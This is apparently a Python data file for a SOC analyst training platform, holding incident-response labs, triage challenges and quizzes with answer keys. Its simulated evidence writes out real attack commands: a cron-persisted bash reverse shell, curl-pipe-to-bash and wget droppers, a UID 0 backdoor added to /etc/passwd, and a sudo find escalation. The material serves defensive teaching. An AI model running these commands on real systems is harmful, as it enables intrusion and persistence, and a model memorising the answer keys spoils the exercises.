H = "/home/analyst/evidence/"


def NET(whois=None, dns=None, nmap=None):
    return {"whois": whois or {}, "dns": dns or {}, "nmap": nmap or {}, "curl": {}}


def lab(id, title, difficulty, duration, category, description, scenario, report_guide, report_keywords, tasks, fs, net=None, pcap="No capture loaded."):
    return {"id": id, "title": title, "difficulty": difficulty, "duration": duration, "category": category, "description": description, "scenario": scenario,
            "report_guide": report_guide, "report_keywords": report_keywords, "tasks": tasks, "kali": {"fs": fs, "net": net or NET(), "pcap": pcap, "cracked": {}}}


def task(id, phase, title, question, answer, hint, options=None):
    return {"id": id, "phase": phase, "title": title, "question": question, "answer": answer, "hint": hint, **({"type": "mcq", "options": options} if options else {})}


PORTSCAN_LAB = lab(
    "lab-net-portscan", "Network Recon: Port Scan to SMB Exploit", "Beginner", "35 min", "Networking",
    "The perimeter firewall logged a sweep of TCP ports from one external IP, then the IDS fired on SMB. Work out what was scanned, what was exposed and what got hit.",
    "08:12 — the IDS raised 'ET SCAN Nmap SYN scan' followed 6 minutes later by 'ET EXPLOIT SMBv1 EternalBlue attempt' against the DMZ. A legacy file server was supposed to be decommissioned last year. Firewall, IDS and NetFlow exports are in ~/evidence.",
    "Cover: the scanner IP, scan type, which ports and host were exposed, the exploit attempt, whether it succeeded, and network response (block, close 445, patch/decommission).",
    ["port scan", "syn", "198.51.100.23", "445", "smb", "fs-legacy", "eternalblue", "block", "firewall", "patch"],
    [task("p1", "Detection", "Scanner IP", "Which external IP performed the port scan?", "198.51.100.23", "head ~/evidence/firewall.log"),
     task("p2", "Detection", "Scan type", "Each probe is a single SYN with no completed handshake. What scan is this?", "TCP SYN (half-open) scan", "Look at the flags column",
          ["TCP SYN (half-open) scan", "Full TCP connect scan", "UDP scan", "ICMP ping sweep"]),
     task("p3", "Investigation", "Exposed port", "Which TCP port answered SYN-ACK on the DMZ host and was then attacked?", "445", "grep ALLOW ~/evidence/firewall.log"),
     task("p4", "Investigation", "Target host", "What is the hostname of the exposed server?", "FS-LEGACY", "cat ~/evidence/ids_alerts.log"),
     task("p5", "Scoping", "Success?", "NetFlow shows a 4 MB session from the server back to the attacker on 4444. What does that indicate?", "The exploit likely succeeded (reverse shell)", "cat ~/evidence/netflow.csv",
          ["The exploit likely succeeded (reverse shell)", "Normal file sharing", "A failed scan", "DNS replication"]),
     task("p6", "Response", "Response", "What is the best network response?", "Isolate FS-LEGACY, block 198.51.100.23 and close inbound 445 at the perimeter", "SMB should never face the internet",
          ["Isolate FS-LEGACY, block 198.51.100.23 and close inbound 445 at the perimeter", "Only block the scanner IP", "Restart the IDS", "Allow 445 but enable logging"])],
    {H + "README.txt": "Evidence: firewall.log (perimeter), ids_alerts.log (Suricata), netflow.csv\nTip: try nmap 10.20.0.15 to see what the attacker saw.\n",
     H + "firewall.log": "\n".join(f"2026-06-14T08:12:{i:02d} DENY TCP 198.51.100.23:{40100 + i} -> 10.20.0.15:{p} flags=S" for i, p in enumerate([21, 22, 23, 25, 80, 110, 139, 143, 443, 3389, 5900, 8080]))
     + "\n2026-06-14T08:12:20 ALLOW TCP 198.51.100.23:40120 -> 10.20.0.15:445 flags=S reply=SA\n2026-06-14T08:18:02 ALLOW TCP 198.51.100.23:40311 -> 10.20.0.15:445 flags=PA bytes=4380\n2026-06-14T08:18:09 ALLOW TCP 10.20.0.15:49833 -> 198.51.100.23:4444 flags=S\n",
     H + "ids_alerts.log": "08:12:05 [1:2009582] ET SCAN NMAP -sS window 1024 198.51.100.23 -> 10.20.0.15 (FS-LEGACY)\n08:18:02 [1:2024218] ET EXPLOIT Possible ETERNALBLUE MS17-010 Echo Response 198.51.100.23 -> 10.20.0.15:445 (FS-LEGACY)\n",
     H + "netflow.csv": "start,src,dst,dport,proto,bytes,duration\n08:18:02,198.51.100.23,10.20.0.15,445,TCP,4380,2s\n08:18:09,10.20.0.15,198.51.100.23,4444,TCP,4194304,1420s\n"},
    NET({"198.51.100.23": "NetRange: 198.51.100.0/24\nOrgName: Cheap VPS LLC\nCountry: US"}, nmap={"10.20.0.15": "PORT    STATE SERVICE\n445/tcp open  microsoft-ds (Windows Server 2008 R2 SMBv1)"}))

BEACON_LAB = lab(
    "lab-net-beacon", "Firewall & Proxy Logs: C2 Beaconing", "Intermediate", "40 min", "Networking",
    "One laptop is calling the same rare domain every 60 seconds, day and night. Use firewall and proxy logs to prove it is command-and-control.",
    "Threat-intel enrichment flagged telemetry-cdn.live as newly registered. The proxy shows a single internal host talking to it around the clock. Firewall, proxy and DNS logs are in ~/evidence.",
    "Cover: the beaconing host and user, C2 domain and IP, the beacon interval and jitter, the user agent, data volume, and response (block, isolate, hunt for other hosts).",
    ["beaconing", "c2", "ws-sales-22", "telemetry-cdn.live", "203.0.113.77", "60", "user agent", "block", "isolate", "proxy"],
    [task("c1", "Detection", "Host", "Which internal host is beaconing?", "WS-SALES-22", "head ~/evidence/proxy.log"),
     task("c2", "Detection", "C2 domain", "Which domain does it beacon to?", "telemetry-cdn.live", "cut the url column of proxy.log"),
     task("c3", "Investigation", "Interval", "What is the beacon interval in seconds?", "60", "Compare the timestamps"),
     task("c4", "Investigation", "Why C2?", "What makes this traffic look like C2 rather than a normal update?", "Fixed interval, tiny identical requests, rare new domain, odd user agent", "Think regularity + rarity",
          ["Fixed interval, tiny identical requests, rare new domain, odd user agent", "It uses HTTPS", "It happens in business hours", "It goes through the proxy"]),
     task("c5", "Response", "Response", "Best response?", "Block the domain and IP at proxy and firewall, isolate WS-SALES-22 and hunt for other hosts contacting it", "Scope before you close",
          ["Block the domain and IP at proxy and firewall, isolate WS-SALES-22 and hunt for other hosts contacting it", "Clear the browser cache", "Whitelist the domain", "Reboot the proxy"])],
    {H + "README.txt": "Evidence: proxy.log, firewall.log, dns.log\n",
     H + "proxy.log": "\n".join(f"2026-06-15T02:{i:02d}:0{i % 3} 10.30.4.22 (WS-SALES-22) user=r.iyer GET https://telemetry-cdn.live/api/v2/ping 200 bytes=312 ua=\"Mozilla/4.0 (compatible; MSIE 6.0)\"" for i in range(10))
     + "\n2026-06-15T09:14:11 10.30.4.40 (WS-SALES-31) user=p.das GET https://www.office.com/ 200 bytes=48211 ua=\"Mozilla/5.0 Edg/125\"\n",
     H + "firewall.log": "2026-06-15T02:00:00 ALLOW TCP 10.30.4.22:51820 -> 203.0.113.77:443 bytes_out=312 bytes_in=96\n2026-06-15T02:01:01 ALLOW TCP 10.30.4.22:51822 -> 203.0.113.77:443 bytes_out=312 bytes_in=96\n2026-06-15T03:12:44 ALLOW TCP 10.30.4.22:51990 -> 203.0.113.77:443 bytes_out=18340211 bytes_in=220\n",
     H + "dns.log": "2026-06-15T02:00:00 10.30.4.22 A telemetry-cdn.live -> 203.0.113.77 ttl=60\n"},
    NET({"telemetry-cdn.live": "Domain Name: TELEMETRY-CDN.LIVE\nCreation Date: 2026-06-12T04:00:00Z\nRegistrar: NameSilo", "203.0.113.77": "OrgName: Offshore Hosting\nCountry: SC"},
        {"telemetry-cdn.live": "203.0.113.77"}))

CRON_LAB = lab(
    "lab-linux-cron", "Linux Cron Persistence & Reverse Shell", "Intermediate", "45 min", "Linux",
    "A Linux web server keeps reconnecting to an unknown IP even after a reboot. Find how the attacker got in, the cron persistence and the reverse shell.",
    "EDR for Linux flagged 'bash -i >& /dev/tcp/...' on WEB-LNX-03 every 5 minutes. The app team says nobody touched the box. auth.log, crontabs, bash history and a netstat snapshot are in ~/evidence.",
    "Cover: the initial access (account and source), the cron entry and its schedule, the reverse shell IP and port, other persistence, and response (remove cron, kill shell, rotate keys, block IP).",
    ["cron", "reverse shell", "www-data", "/etc/cron.d/sysupdate", "185.243.115.9", "4444", "authorized_keys", "remove", "block", "rotate"],
    [task("r1", "Detection", "Reverse shell", "What IP:port does the reverse shell connect to?", "185.243.115.9:4444", "cat ~/evidence/netstat.txt"),
     task("r2", "Investigation", "Cron file", "Which cron file holds the persistence? (full path)", "/etc/cron.d/sysupdate", "ls / cat files under ~/evidence/cron"),
     task("r3", "Investigation", "Schedule", "The entry starts with */5 * * * *. How often does it run?", "Every 5 minutes", "Cron fields: minute hour day month weekday",
          ["Every 5 minutes", "At 5 AM daily", "On the 5th of every month", "Every 5 hours"]),
     task("r4", "Investigation", "Running as", "Which account was used to drop the cron job via the vulnerable upload page?", "www-data", "cat ~/evidence/bash_history_www-data"),
     task("r5", "Scoping", "Second persistence", "What other file did the attacker modify to keep access?", "/root/.ssh/authorized_keys", "grep ssh ~/evidence/bash_history_www-data"),
     task("r6", "Response", "Response", "Which response fully removes the attacker?", "Delete the cron file and attacker SSH key, kill the shell, patch the upload page, block the IP", "Two persistence mechanisms",
          ["Delete the cron file and attacker SSH key, kill the shell, patch the upload page, block the IP", "Only kill the bash process", "Reboot the server", "Only block the IP"])],
    {H + "README.txt": "Evidence: auth.log, cron/ (crontab exports), bash_history_www-data, netstat.txt, access.log (nginx)\n",
     H + "access.log": "185.243.115.9 - - [16/Jun/2026:01:10:02] \"POST /upload.php HTTP/1.1\" 200 \"shell.php\"\n185.243.115.9 - - [16/Jun/2026:01:10:30] \"GET /uploads/shell.php?c=id HTTP/1.1\" 200\n",
     H + "bash_history_www-data": "id\nuname -a\nsudo -l\necho '*/5 * * * * root bash -c \"bash -i >& /dev/tcp/185.243.115.9/4444 0>&1\"' > /etc/cron.d/sysupdate\necho 'ssh-ed25519 AAAAC3Nz...attacker' >> /root/.ssh/authorized_keys\nhistory -c\n",
     H + "cron/etc_crontab": "17 * * * * root cd / && run-parts --report /etc/cron.hourly\n",
     H + "cron/etc_cron.d_sysupdate": "*/5 * * * * root bash -c \"bash -i >& /dev/tcp/185.243.115.9/4444 0>&1\"\n",
     H + "cron/etc_cron.d_logrotate": "0 3 * * * root /usr/sbin/logrotate /etc/logrotate.conf\n",
     H + "netstat.txt": "Proto Local Address        Foreign Address        State       PID/Program\ntcp   10.40.0.13:22        10.40.0.5:51022        ESTABLISHED 812/sshd\ntcp   10.40.0.13:38812     185.243.115.9:4444     ESTABLISHED 2231/bash\n",
     H + "auth.log": "Jun 16 01:11:40 web-lnx-03 sudo: www-data : NOT in sudoers ; COMMAND=/bin/bash\nJun 16 01:12:02 web-lnx-03 CRON[2201]: (root) CMD (bash -c \"bash -i >& /dev/tcp/185.243.115.9/4444 0>&1\")\n"},
    NET({"185.243.115.9": "NetRange: 185.243.115.0/24\nOrgName: Bulletproof Networks\nCountry: MD"}))

PRIVESC_LAB = lab(
    "lab-linux-privesc", "Linux Privilege Escalation via Sudo Misconfig", "Advanced", "50 min", "Linux",
    "A developer account suddenly spawned a root shell on a build server. Prove how sudo was abused, what backdoor was left and how to close it.",
    "auditd on BUILD-02 alerted 'uid=0 shell spawned by find'. The account belongs to a contractor, j.alvarez, whose contract ended yesterday. sudoers, auth.log, auditd output and /etc/passwd are in ~/evidence.",
    "Cover: the account, the sudo rule abused, the GTFOBins technique, the backdoor account, timeline, and response (disable account, fix sudoers, remove backdoor, review other hosts).",
    ["privilege escalation", "sudo", "j.alvarez", "find", "gtfobins", "-exec", "uid 0", "sysbackup", "sudoers", "disable"],
    [task("e1", "Detection", "Account", "Which user escalated to root?", "j.alvarez", "grep sudo ~/evidence/auth.log"),
     task("e2", "Investigation", "Abused binary", "Which binary allowed by sudo was used to spawn a root shell?", "find", "cat ~/evidence/sudoers_snippet"),
     task("e3", "Investigation", "Technique", "Why does 'sudo find . -exec /bin/sh \\; -quit' give root?", "find runs -exec commands with sudo's root privileges (GTFOBins)", "Look it up on GTFOBins",
          ["find runs -exec commands with sudo's root privileges (GTFOBins)", "find exploits a kernel bug", "It cracks the root password", "It reads /etc/shadow over the network"]),
     task("e4", "Scoping", "Backdoor", "Which new account with UID 0 was added to /etc/passwd?", "sysbackup", "grep ':0:' ~/evidence/passwd"),
     task("e5", "Response", "Response", "Best fix?", "Disable j.alvarez, remove sysbackup, restrict sudoers to exact safe commands and audit other servers", "Least privilege",
          ["Disable j.alvarez, remove sysbackup, restrict sudoers to exact safe commands and audit other servers", "Only change root's password", "Delete /usr/bin/find", "Reboot BUILD-02"])],
    {H + "README.txt": "Evidence: auth.log, sudoers_snippet, audit.log, passwd (BUILD-02)\n",
     H + "sudoers_snippet": "# contractor build access\nj.alvarez ALL=(root) NOPASSWD: /usr/bin/find, /usr/bin/make\n",
     H + "auth.log": "Jun 17 22:40:11 build-02 sshd[3011]: Accepted password for j.alvarez from 10.50.2.88 port 50211 ssh2\nJun 17 22:41:02 build-02 sudo: j.alvarez : TTY=pts/0 ; PWD=/home/j.alvarez ; USER=root ; COMMAND=/usr/bin/find . -exec /bin/sh ; -quit\nJun 17 22:42:30 build-02 useradd[3102]: new user: name=sysbackup, UID=0, GID=0, home=/var/tmp, shell=/bin/bash\n",
     H + "audit.log": "type=EXECVE msg=audit(1781736062.1:881): argc=2 a0=\"/bin/sh\" auid=1004(j.alvarez) uid=0 euid=0 ppid_comm=\"find\"\n",
     H + "passwd": "root:x:0:0:root:/root:/bin/bash\nj.alvarez:x:1004:1004::/home/j.alvarez:/bin/bash\nsysbackup:x:0:0::/var/tmp:/bin/bash\n"})

NET_LINUX_LABS = [PORTSCAN_LAB, BEACON_LAB, CRON_LAB, PRIVESC_LAB]


def ch(id, title, category, severity, points, difficulty, verdict, description, alert, evidence, keywords):
    return {"id": id, "title": title, "category": category, "severity": severity, "points": points, "difficulty": difficulty, "verdict": verdict,
            "description": description, "alert": alert, "evidence": evidence, "keywords": keywords}


NET_LINUX_CHALLENGES = [
    ch("ch-net-01", "Internal Port Scan from a Workstation", "Networking", "Medium", 100, "Easy", "TP",
       "The internal IDS saw one HR workstation probe 1,024 ports on 40 servers in 3 minutes.",
       {"rule": "SOC410 - Internal Network Port Scan", "time": "2026-06-18 10:02", "host": "WS-HR-09", "user": "k.wong", "src_ip": "10.10.8.19"},
       ["Firewall: 41,000 SYN packets from 10.10.8.19 to 10.10.1.0/24, ports 1-1024, 98% RST", "EDR: nmap.exe launched from C:\\Users\\k.wong\\Downloads at 09:59",
        "k.wong is an HR coordinator with no IT duties; no change ticket exists", "Proxy: k.wong downloaded nmap-7.94-setup.exe at 09:55"],
       ["nmap", "port scan", "10.10.8.19", "syn", "isolate", "no change ticket"]),
    ch("ch-net-02", "Firewall Deny Storm from the Vulnerability Scanner", "Networking", "Low", 80, "Easy", "FP",
       "The perimeter firewall logged 90,000 denies in an hour from one internal IP to every subnet.",
       {"rule": "SOC411 - Excessive Firewall Denies", "time": "2026-06-18 01:00", "host": "FW-CORE-01", "user": "svc_nessus", "src_ip": "10.0.9.50"},
       ["10.0.9.50 is VULN-SCAN-01, the documented Nessus scanner in the asset inventory", "Change calendar: weekly authenticated scan, Sundays 01:00-03:00",
        "Scan stopped at 02:47 as scheduled", "No outbound connections from 10.0.9.50 to the internet"],
       ["scanner", "nessus", "scheduled", "asset inventory", "change", "tuning", "exclude"]),
    ch("ch-net-03", "Outbound RDP to the Internet on Port 3389", "Networking", "High", 120, "Medium", "TP",
       "NetFlow shows a finance workstation holding a 3-hour RDP session to an IP in another country.",
       {"rule": "SOC412 - Outbound RDP to External IP", "time": "2026-06-19 14:20", "host": "WS-FIN-04", "user": "l.costa", "dst_ip": "91.92.240.15", "dst_port": "3389"},
       ["NetFlow: WS-FIN-04 -> 91.92.240.15:3389 TCP, 182 min, 640 MB outbound", "Policy: outbound 3389 should be blocked, rule FW-117 was disabled during troubleshooting on 06-12",
        "EDR: mstsc.exe not running — traffic comes from 'AnyDeskPortable.exe' tunnelling RDP", "Intel: 91.92.240.15 linked to tech-support scam infrastructure"],
       ["3389", "rdp", "91.92.240.15", "anydesk", "exfiltration", "block", "fw-117", "isolate"]),
    ch("ch-net-04", "ARP Spoofing on the Office VLAN", "Networking", "High", 120, "Medium", "TP",
       "Several users report certificate warnings; the switch logged the gateway MAC changing.",
       {"rule": "SOC413 - Duplicate IP / ARP Spoofing Detected", "time": "2026-06-19 11:05", "host": "SW-FLOOR2", "user": "-", "src_ip": "10.60.2.77"},
       ["Switch: gateway 10.60.2.1 MAC flapped from 00:1a:2b:3c:4d:01 to 9c:b6:d0:11:22:33 on port Gi1/0/18", "DHCP: 9c:b6:d0:11:22:33 leased 10.60.2.77 to host 'kali' 20 min earlier",
        "Users on VLAN 60 saw TLS certificate errors for webmail between 11:00 and 11:06", "Gi1/0/18 is a meeting-room port"],
       ["arp spoofing", "mitm", "mac", "9c:b6:d0:11:22:33", "gi1/0/18", "shut", "port security", "dhcp snooping"]),
    ch("ch-net-05", "Large HTTPS Upload to a File-Sharing Site", "Networking", "Critical", 150, "Hard", "TP",
       "DLP did not fire, but the proxy logged 6.2 GB uploaded to a file-sharing service from an engineering server at 02:00.",
       {"rule": "SOC414 - Abnormal Outbound Data Volume", "time": "2026-06-20 02:14", "host": "ENG-SRV-07", "user": "svc_build", "url": "https://mega.nz"},
       ["Proxy: ENG-SRV-07 POST mega.nz 6.2 GB over 40 min, baseline for this host is < 50 MB/day", "EDR: rclone.exe copy D:\\source mega:backup --transfers 8 run by svc_build",
        "svc_build signed in interactively from 10.70.1.44 (a jump host) at 01:52 — it is a non-interactive account", "7z.exe created source_full.7z (6.1 GB) at 01:58"],
       ["exfiltration", "rclone", "mega.nz", "6.2 gb", "svc_build", "7z", "disable", "block", "baseline"]),
    ch("ch-lnx-01", "SSH Login from a New Country on a Web Server", "Linux", "High", 100, "Medium", "TP",
       "A web server's auth.log shows a successful SSH login for the app account from an IP never seen before.",
       {"rule": "SOC420 - SSH Login from Rare Geo", "time": "2026-06-21 03:33", "host": "WEB-LNX-01", "user": "appuser", "src_ip": "5.188.62.140"},
       ["auth.log: Accepted password for appuser from 5.188.62.140 port 52211 ssh2", "Same IP had 1,900 'Failed password' lines for appuser in the previous hour",
        "appuser normally logs in only from 10.40.0.5 (bastion) with a key", "bash_history: wget http://5.188.62.140/x86 -O /tmp/.x; chmod +x /tmp/.x"],
       ["brute force", "ssh", "5.188.62.140", "appuser", "/tmp/.x", "disable password", "key only", "block"]),
    ch("ch-lnx-02", "Cron Job Piping curl into bash", "Linux", "High", 120, "Medium", "TP",
       "File integrity monitoring flagged a new file in /etc/cron.d on a database server.",
       {"rule": "SOC421 - New Cron Persistence", "time": "2026-06-21 04:10", "host": "DB-LNX-02", "user": "root", "command": "*/10 * * * * root curl -fsSL http://45.9.148.21/u.sh | bash"},
       ["/etc/cron.d/.update created at 04:08 — hidden file name, not managed by Ansible", "u.sh downloads xmrig and kills competing miners", "No change ticket for DB-LNX-02 this week",
        "Intel: 45.9.148.21 hosts TeamTNT-style cryptojacking scripts"],
       ["cron", "persistence", "curl", "45.9.148.21", "/etc/cron.d/.update", "xmrig", "remove", "block"]),
    ch("ch-lnx-03", "Sudo to Root by the Deploy Account During a Release", "Linux", "Low", 80, "Easy", "FP",
       "SIEM alerted on 'sudo su -' by the deploy account on three app servers within 2 minutes.",
       {"rule": "SOC422 - Interactive Root Shell via Sudo", "time": "2026-06-22 18:30", "host": "APP-LNX-01", "user": "deploy"},
       ["Release CHG-5120 approved: v4.2 rollout 18:00-19:00 on APP-LNX-01..03", "Commands match the documented runbook (systemctl restart app, migrate.sh)",
        "Source IP 10.40.0.5 is the CI bastion", "Sessions closed at 18:41 with no further activity"],
       ["change", "chg-5120", "runbook", "bastion", "legitimate", "tuning", "release"]),
    ch("ch-lnx-04", "New UID 0 Account in /etc/passwd", "Linux", "Critical", 150, "Hard", "TP",
       "auditd reported a write to /etc/passwd creating an account with UID 0 on a payment server.",
       {"rule": "SOC423 - Root-Equivalent Account Created", "time": "2026-06-22 23:02", "host": "PAY-LNX-01", "user": "backup", "command": "echo 'sys:x:0:0::/tmp:/bin/bash' >> /etc/passwd"},
       ["auditd: write to /etc/passwd by pid 4120 (bash) auid=backup", "backup account gained root via writable /etc/passwd (permissions 666 since a bad chmod on 06-20)",
        "auth.log: su sys succeeded at 23:03 from pts/1", "Payment app config /opt/pay/db.conf read at 23:05"],
       ["uid 0", "/etc/passwd", "sys", "666", "chmod", "privilege escalation", "remove", "rotate", "pci"]),
    ch("ch-lnx-05", "Cryptominer Pegging CPU on a Linux Host", "Linux", "Medium", 100, "Medium", "TP",
       "Monitoring shows 100% CPU on a Kubernetes worker; a process named 'kworkerd' is not a real kernel thread.",
       {"rule": "SOC424 - Suspicious High-CPU Process", "time": "2026-06-23 07:45", "host": "K8S-WRK-03", "user": "nobody", "process": "/tmp/.kworkerd"},
       ["ps: /tmp/.kworkerd -o stratum+tcp://pool.minexmr.example:4444 -u 48edfHu7V9Z84", "Process binary lives in /tmp, real kworker threads have no path",
        "netstat: outbound TCP 4444 to 162.19.139.184", "Exposed Docker API on 2375 received 'docker run' from 141.98.11.62 at 07:40"],
       ["cryptominer", "xmrig", "/tmp/.kworkerd", "4444", "2375", "docker api", "kill", "block", "close"]),
]


def Q(id, text, options, answer, explanation, topic, type="mcq"):
    return {"id": id, "type": type, "text": text, "options": options, "answer": answer, "explanation": explanation, "topic": topic}


EXTRA_QUESTIONS = [
    Q("qn1", "Which layer of the OSI model do TCP and UDP belong to?", ["Network (3)", "Transport (4)", "Session (5)", "Data link (2)"], [1], "TCP and UDP are Layer 4 transport protocols.", "Networking"),
    Q("qn2", "What does a SYN followed by a RST from the target usually mean?", ["The port is closed", "The port is open", "The host is down", "A firewall dropped it silently"], [0], "A closed port answers SYN with RST; open ports reply SYN-ACK.", "Networking"),
    Q("qn3", "Which port does DNS use by default?", ["53", "25", "123", "389"], [0], "DNS uses UDP/TCP 53.", "Networking"),
    Q("qn4", "10.0.0.0/8, 172.16.0.0/12 and 192.168.0.0/16 are:", ["Private (RFC 1918) ranges", "Multicast ranges", "Reserved for DNS", "Public cloud ranges"], [0], "These are the RFC 1918 private address ranges.", "Networking"),
    Q("qn5", "Which protocol maps IP addresses to MAC addresses on a LAN?", ["ARP", "DHCP", "ICMP", "NAT"], [0], "ARP resolves IPs to MAC addresses — and can be spoofed.", "Networking"),
    Q("ql1", "Which Linux file records SSH logins on Debian/Ubuntu?", ["/var/log/auth.log", "/var/log/kern.log", "/etc/shadow", "/var/log/dpkg.log"], [0], "auth.log holds sshd, sudo and PAM events.", "Linux"),
    Q("ql2", "What does the cron schedule '*/5 * * * *' mean?", ["Every 5 minutes", "Every 5 hours", "At 5 AM daily", "Every 5 days"], [0], "The first field is minutes; */5 = every 5 minutes.", "Linux"),
    Q("ql3", "A second account with UID 0 in /etc/passwd means:", ["It has root privileges", "It is disabled", "It is a service account", "It has no shell"], [0], "UID 0 is root, whatever the account name.", "Linux"),
    Q("ql4", "Which command shows what a user may run with sudo?", ["sudo -l", "id -a", "whoami", "chmod +s"], [0], "sudo -l lists the allowed sudo commands — attackers run it right after access.", "Linux"),
    Q("ql5", "Executables running from /tmp or /dev/shm on a server are:", ["Highly suspicious", "Normal system services", "Kernel threads", "Package updates"], [0], "World-writable temp dirs are a classic malware drop location.", "Linux"),
    Q("qw1", "What is the main job of an L1 SOC analyst?", ["Triage alerts, classify TP/FP and escalate real incidents", "Write malware", "Run penetration tests", "Approve firewall changes"], [0], "L1 owns first-line triage and escalation.", "SOC Workflow"),
    Q("qw2", "An alert matches a documented, approved change ticket. It is most likely:", ["A false positive / benign true positive", "A critical incident", "A sign of APT", "A SIEM outage"], [0], "Approved, documented activity is benign — close it and suggest tuning.", "SOC Workflow"),
    Q("qw3", "A good escalation ticket to L2 must include:", ["Summary, affected assets, evidence, IOCs, actions taken and recommended next steps", "Only the alert name", "A screenshot of the SIEM home page", "The analyst's opinion only"], [0], "L2 should be able to act without re-doing your triage.", "SOC Workflow"),
    Q("qw4", "An SLA of '15 minutes for P1' usually means:", ["A critical alert must be acknowledged/triaged within 15 minutes", "Tickets close after 15 minutes", "Shifts last 15 minutes", "L2 replies in 15 minutes"], [0], "SLAs define response times per priority.", "SOC Workflow"),
    Q("qw5", "What belongs in a shift handover?", ["Open incidents, pending escalations, ongoing alerts and context the next shift needs", "Only the number of alerts", "Nothing — the SIEM has it", "The analyst's passwords"], [0], "A clean handover keeps investigations moving between shifts.", "SOC Workflow"),
    Q("qf1", "Ransomware encrypting files mainly violates which part of the CIA triad?", ["Availability", "Confidentiality", "Integrity", "Accountability"], [0], "Encrypted data is unavailable — availability is hit (and often confidentiality via leaks).", "Foundations"),
    Q("qf2", "In MITRE ATT&CK, 'Persistence' is a:", ["Tactic", "Technique", "Procedure", "Software"], [0], "Tactics are the 'why' (goal); techniques are the 'how'.", "Foundations"),
    Q("qf3", "T1110 in MITRE ATT&CK is:", ["Brute Force", "Phishing", "Command and Scripting Interpreter", "Valid Accounts"], [0], "T1110 = Brute Force (incl. password spraying).", "Foundations"),
    Q("qf4", "Tampering with log files to hide activity attacks:", ["Integrity", "Availability", "Confidentiality", "Non-repudiation only"], [0], "Altered logs can no longer be trusted — an integrity violation.", "Foundations"),
    Q("qf5", "A detection rule that fires on every admin login generates mostly:", ["False positives", "True positives", "False negatives", "Zero alerts"], [0], "Overly broad rules flood the SOC with false positives — tune them.", "Foundations"),
]


def quiz(id, title, topic, prefix):
    return {"id": id, "title": title, "topic": topic, "time_limit_sec": 0, "path_id": None, "pass_mark": 70, "published": True,
            "questions": [q for q in EXTRA_QUESTIONS if q["id"].startswith(prefix)]}


EXTRA_QUIZZES = [
    quiz("quiz-networking", "Networking Essentials for SOC Analysts", "Networking", "qn"),
    quiz("quiz-linux", "Linux Essentials for SOC Analysts", "Linux", "ql"),
    quiz("quiz-soc-workflow", "SOC Workflow: Triage, Escalation & Ticketing", "SOC Workflow", "qw"),
    quiz("quiz-foundations", "Security Foundations: CIA Triad, MITRE ATT&CK & Detections", "Foundations", "qf"),
]
